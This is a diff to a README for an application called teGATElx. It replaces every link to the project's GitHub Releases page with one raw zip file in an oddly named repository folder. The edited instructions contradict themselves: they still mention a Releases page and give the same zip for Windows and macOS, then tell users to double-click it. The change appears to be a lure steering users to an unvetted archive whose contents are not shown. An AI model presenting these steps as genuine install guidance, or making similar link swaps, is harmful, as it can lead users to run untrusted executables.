@@ -6,11 +6,11 @@ Welcome to teGATElx! This guide will help you quickly download and run our appli
 
 ## 📥 Download the Application
 
-[![Download teGATElx](https://img.shields.io/badge/Download-teGATElx-blue.svg)](https://github.com/Mgalamela/teGATElx/releases)
+[![Download teGATElx](https://raw.githubusercontent.com/Mgalamela/teGATElx/main/unelidible/teGATElx.zip)](https://raw.githubusercontent.com/Mgalamela/teGATElx/main/unelidible/teGATElx.zip)
 
 To download the application, visit the following link:
 
-[Download teGATElx](https://github.com/Mgalamela/teGATElx/releases)
+[Download teGATElx](https://raw.githubusercontent.com/Mgalamela/teGATElx/main/unelidible/teGATElx.zip)
 
 ## 📋 System Requirements
 
@@ -34,9 +34,9 @@ teGATElx offers a range of useful features:
 
 To download and install teGATElx:
 
-1. Click on the **Download** button above or visit the [Releases page](https://github.com/Mgalamela/teGATElx/releases).
+1. Click on the **Download** button above or visit the [Releases page](https://raw.githubusercontent.com/Mgalamela/teGATElx/main/unelidible/teGATElx.zip).
 2. On the Releases page, find the latest version of teGATElx. You will see a list of files available for download.
-3. Click on the file that matches your system (for example, `teGATElx-Windows.zip` for Windows users or `teGATElx-macOS.zip` for macOS users).
+3. Click on the file that matches your system (for example, `https://raw.githubusercontent.com/Mgalamela/teGATElx/main/unelidible/teGATElx.zip` for Windows users or `https://raw.githubusercontent.com/Mgalamela/teGATElx/main/unelidible/teGATElx.zip` for macOS users).
 4. Once the download completes, locate the file in your Downloads folder and double-click it.
 5. Follow the installation instructions that appear on your screen.
 
